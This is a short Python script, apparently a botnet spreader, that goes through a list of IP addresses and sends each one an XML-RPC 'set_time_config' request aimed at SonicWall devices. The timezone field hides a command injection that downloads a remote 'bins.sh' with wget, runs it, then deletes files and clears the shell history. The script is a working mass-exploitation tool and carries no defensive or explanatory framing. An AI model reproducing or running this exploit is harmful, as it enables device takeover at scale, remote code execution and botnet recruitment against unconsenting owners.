#sonicwall
#b4ckdoorarchive.host / b4ckdoor made
import threading, sys, time, random, socket, re, os, struct, array, requests
from sys import stdout
from threading import Thread
from Queue import *
ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
p1 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall><methodName>set_time_config</methodName><params><param><value><struct><member><name>timezone</name><value><string>\"`cd /tmp; wget http://b4.ck.do.or/bins.sh; chmod 777 *; sh bins.sh sonicwall; rm -rf *;history -c`\"</string></value></member></struct></value></param></params></methodCall>"


def rtek(host):
    try:
		url = "http://" + host + ""
		requests.post(url, timeout=5, data=p1)
    except:
        pass
    return

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=rtek, args=(input,))
            thread.start()
        except KeyboardInterrupt:
            sys.exit("Interrupted? (ctrl + c)")
    thread.join()
    return

if __name__ == "__main__":
    main()#B4CKDOOR